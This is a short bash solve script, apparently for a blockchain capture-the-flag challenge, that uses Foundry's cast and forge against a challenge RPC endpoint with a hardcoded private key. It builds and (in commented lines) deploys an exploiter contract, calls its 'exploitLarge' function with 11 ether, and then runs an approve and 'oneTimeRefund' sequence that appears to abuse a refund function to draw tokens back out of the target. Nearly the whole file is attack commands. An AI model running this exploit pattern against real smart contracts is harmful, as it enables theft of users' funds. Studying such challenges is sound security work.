#!/usr/bin/env bash
#!CMD: ./solve.sh
RPC_URL="http://94.237.50.40:42634/"

PRIVATE_KEY="0x7e6e47931a5a553a3c25a1a18f3a0d8e7af7f3b09a5c329dc29f379ff5a416e1"
PLAYER_ADDRESS="0xd3fc8865E277F745Ae95CeC43837f7D6407fa178"
TARGET_ADDRESS="0xBd4D76f0B71FF4BC3f37BDe62BD0E71b0BA18622"
SETUP_CONTRACT="0xcD660C0D98f8E92a6D24b9ACFB9De78B70632165"

BYTECODE=$(cd ./helios-exploit/ && forge inspect src/HeliosExploiter.sol:LargeSwapExploiter bytecode)

EXPLOIT_CONTRACT_1="0x2763a49ed5C03DE5FB9d75EA37aD26DB2CD4DEFE"

# Deploy the contract
# cast send --rpc-url $RPC_URL --private-key $PRIVATE_KEY --create $BYTECODE

cast balance --rpc-url $RPC_URL $PLAYER_ADDRESS

# cast send $TARGET_ADDRESS "swapForMAL()" --value 0.25ether --rpc-url $RPC_URL --private-key $PRIVATE_KEY

# Run exploit
# cast send --rpc-url $RPC_URL --private-key $PRIVATE_KEY $EXPLOIT_CONTRACT_1 "exploitLarge(address)" $TARGET_ADDRESS --value 11ether
# cast balance --rpc-url $RPC_URL $PLAYER_ADDRESS


MAL_A="0x4e7828cdabbc9ed830eaa3837b57a127b446fea9"


cast call $TARGET_ADDRESS "malakarEssence()" --rpc-url $RPC_URL
cast call $MAL_A "balanceOf(address)" $PLAYER_ADDRESS --rpc-url $RPC_URL

cast send $MAL_A "approve(address,uint256)" $TARGET_ADDRESS 1 --rpc-url $RPC_URL --private-key $PRIVATE_KEY
cast send $TARGET_ADDRESS "oneTimeRefund(address,uint256)" $MAL_A 1 --rpc-url $RPC_URL --private-key $PRIVATE_KEY
cast call $MAL_A "balanceOf(address)" $PLAYER_ADDRESS --rpc-url $RPC_URL
